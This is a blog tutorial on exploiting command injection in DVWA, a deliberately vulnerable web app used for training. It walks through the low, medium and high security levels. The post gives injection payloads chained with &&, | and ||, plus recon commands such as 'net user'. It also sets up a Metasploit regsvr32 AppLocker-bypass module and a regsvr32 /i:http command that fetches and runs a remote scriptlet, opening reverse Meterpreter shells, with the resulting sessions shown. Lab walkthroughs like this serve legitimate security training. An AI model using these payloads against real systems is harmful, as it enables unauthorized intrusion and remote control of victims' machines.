<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a>, <a href="https://www.hackingarticles.in/category/website-hacking/" rel="category tag">Website Hacking</a></span>            </div>
            <h1 class="post-title entry-title">Command Injection Exploitation in DVWA using Metasploit (Bypass All Security)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/command-injection-exploitation-dvwa-using-metasploit-bypass-security/" rel="bookmark"><time class="entry-date published" datetime="2016-11-01T19:59:53+00:00">November 1, 2016</time><time class="updated" datetime="2025-05-27T13:18:44+00:00">May 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p style="text-align: justify;"><span style="color: #000000;">Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.</span></p>
<p style="text-align: justify;"><span style="color: #000000;">This attack differs from Code Injection, in that code injection allows the attacker to add his own code that is then executed by the application. In Code Injection, the attacker extends the default functionality of the application without the necessity of executing system commands. Source:</span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong><a style="color: #000000;" href="https://owasp.org/www-community/attacks/Command_Injection">https://www.owasp.org/index.php/Command_Injection</a></strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong> </strong>First install the DVWA in your PC full article read <strong><a style="color: #000000;" href="https://www.hackingarticles.in/web-application-lab-setup-on-windows/">here</a></strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;">Now open the DVWA in your pc and login with following credentials:</span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>Username</strong> – admin</span></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>Password</strong> – password</span></p>
<h3 style="text-align: justify;"><span style="color: #800000;">Bypass Low Level Security</span></h3>
<p style="text-align: justify;"><span style="color: #000000;">Click on <strong>DVWA Security</strong> and set Website <strong>Security Level low</strong></span></p>
<p style="text-align: justify;"><span style="color: #000000;">Use <strong>“&amp;&amp;”</strong> in command injection to bypass low security of this server.</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://3.bp.blogspot.com/-7Fke5aVbpOE/WBjtL_AOCdI/AAAAAAAAN7A/BI7s0w2ZmOM2cX-OWxXXPSsbI7kX9p-CQCLcB/s1600/1.png"/></p>
<p><span style="color: #000000;">Go to the command execution page Enter an IP address and click on submit.</span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-__MMWm415CE/WBjtMkSEmTI/AAAAAAAAN7U/-EWzuOEx8jM3uvYfno4Y8SFQKIlcRo7RQCEw/s1600/2.1.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Now you can see the reply that tells us that we have establish a connection with the server. I have tried this numerous times just to be sure and so can you, therefore, whenever you will execute this cammand you will see the following :</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://3.bp.blogspot.com/-GcmEOfr32rU/WBjtNMLNdLI/AAAAAAAAN7Y/DeLEGX9lQxkMU976aHjAl2ot_KIeXEE3QCEw/s1600/2.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">We can also implement multiple commands simultaneously just by using <strong>&amp; </strong>sign. For example next command is :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">192.168.1.100 &amp;&amp; dir</pre>
<p style="text-align: justify;"><span style="color: #000000;">After the above command click on <strong>submit,</strong> performing the said command will itemize all directories and files.</span></p>
<p style="text-align: justify;"><img decoding="async" src="https://2.bp.blogspot.com/-bSBjknu8jc8/WBjtNe80flI/AAAAAAAAN7c/Lm8_y8dS2LMMl52xe65Tn718oixroZRDwCEw/s1600/3.1.png"/></p>
<p><span style="color: #000000;">We have found 4 directories and a file and also that path of the directory.</span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-BMjitmtnNQ8/WBjtNkQ-mfI/AAAAAAAAN7g/VcEjTQ3KJ_0anuRaZd3Il70nNUjtll38wCEw/s1600/3.png"/></p>
<p><span style="color: #000000;">Next command is <strong>192.168.1.100 &amp;&amp; net user </strong>click on <strong>submit, </strong>this command will show the user’s list</span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-D1MLaBc742k/WBjtNx6paII/AAAAAAAAN7o/kbBfIU4HnXUiDEOt2807596j3uXoENo9wCEw/s1600/4.1.png"/></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-pDLA_fypjk8/WBjtN-HAxCI/AAAAAAAAN7k/9gResDrRYhQJuPEXl5ZPKKOaBJVqqt2vwCEw/s1600/4.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Various commands are available which when submitted will give the intended outcome. So firstly, we will find a way to transfer our malevolent payload to the remote machine and for that I am using my favorite tool metasploit. To use metasploit al you have to do is type<strong> msfconsole</strong> in kali terminal and then type the following commands</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use exploit/windows/misc/regsvr32_applocker_bypass_server
msf exploit(regsvr32_applocker_bypass_server) &gt; set payload windows/meterpreter/reverse_tcp
msf exploit(regsvr32_applocker_bypass_server) &gt; set lhost 192.168.1.106
msf exploit(regsvr32_applocker_bypass_server) &gt; set lport  4444
msf exploit(regsvr32_applocker_bypass_server) &gt; exploit</pre>
<p style="text-align: justify;"><img decoding="async" src="https://3.bp.blogspot.com/-Z134MSj2pTs/WBjtOBLGhcI/AAAAAAAAN7s/yVtDaTqlC8MSK8Uo2OTgzDxfBpqH9-UzgCEw/s1600/5.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">We can use the following command in order to open a port on the remote host and to connect back to it with metasploit.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">192.168.1.100 &amp;&amp; regsvr32 /s /n /u /i:http://192.168.1.103:8080/C99PdFH.sct scrobj.dll</pre>
<p style="text-align: justify;"><span style="color: #000000;">and click on <strong>submit</strong></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-FUtNg4uiRqA/WBjtOXqUU3I/AAAAAAAAN7w/UZGiJMA6qrQNf6q_1ZPKK6N2KEYyYJDVQCEw/s1600/6.png"/></p>
<p><span style="color: #000000;">Now you will get meterpreter session of victim’s PC. And type <strong>sysinfo</strong> to get system information.</span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-p8b-CHVn84Q/WBjtO7dDJEI/AAAAAAAAN74/oigMfJ-1aHM8DlYn6etbWktdfzV0PvsSwCEw/s1600/7.png"/></p>
<h3><span style="color: #800000;"><strong>Bypass Medium Level Security</strong></span></h3>
<p><span style="color: #000000;">Click on DVWA Security and set Website Security Level <strong>Medium</strong></span></p>
<p><span style="color: #000000;">Use pipe <strong>“|” </strong>in command injection to bypass medium security of this server.</span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-pLB4u_gC7yM/WBjtO0mboDI/AAAAAAAAN70/Zw4eoo3pENcLiUHyykpmhf17VQJo5LBbwCEw/s1600/8.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Follow same process as above using metasploit and further type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">192.168.1.100 | regsvr32 /s /n /u /i:http://192.168.1.103:8080/C99PdFH.sct scrobj.dll</pre>
<p style="text-align: justify;"><img decoding="async" src="https://3.bp.blogspot.com/-hHEfZkXqg1U/WBjtPC_PpuI/AAAAAAAAN78/sOOT5yCJ5OMdWksrHso6yLF1PKX8eQmgACEw/s1600/9.png"/></p>
<p><span style="color: #000000;">Again we got meterpreter session 2</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-6s-JQyeqYwA/WBjtMO1-7II/AAAAAAAAN7I/XeV3FBJDG5A9ncguGQiVWKLaWb1WQ4ODwCEw/s1600/10.png"/></p>
<h3><span style="color: #800000;"><strong>Bypass High Level Security</strong></span></h3>
<p><span style="color: #000000;">Click on DVWA Security and set Website Security Level <strong>High</strong></span></p>
<p><span style="color: #000000;">Try to use pipe “<strong>||</strong>” in command injection to bypass high security of this server</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-7nIqXZ74cQM/WBjtMOvLv9I/AAAAAAAAN7E/nRtOKtoWIUoGJNtjGgrbskg1jJOM6iCjwCEw/s1600/11.png"/></p>
<p style="text-align: justify;"><span style="color: #000000;">Follow same process as above using metasploit</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">192.168.1.100 || regsvr32 /s /n /u /i:http://192.168.1.103:8080/C99PdFH.sct scrobj.dll</pre>
<p style="text-align: justify;"><span style="color: #000000;">and click on <strong>submit</strong></span></p>
<p style="text-align: justify;"><img decoding="async" src="https://4.bp.blogspot.com/-Q3EM9n0vYTI/WBjtMnSYz_I/AAAAAAAAN7M/1pkVxUtgrYApXHDKbrOVfcsGWutoCCcVQCEw/s1600/12.png"/></p>
<p><span style="color: #000000;">Yes, we have got meterpreter session 3!!</span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-eLDwJEy2raY/WBjtMpgvhfI/AAAAAAAAN7Q/6snB8VDkVCQ-jVonkj0arhkAT-C39jE4wCEw/s1600/13.png"/></p>
<p><span style="color: #000000;">Finally we have completed all three level low, medium, high in DVWA.</span></p>
<p><span style="color: #000000;">To learn more about Website Hacking. Follow this</span> <a href="https://www.hackingarticles.in/category/website-hacking/"><strong>Link.</strong></a></p>
<p style="text-align: justify;"><span style="color: #000000;"><strong>Author</strong>: Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact <a href="https://www.linkedin.com/in/aarti--singh/"><strong>here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
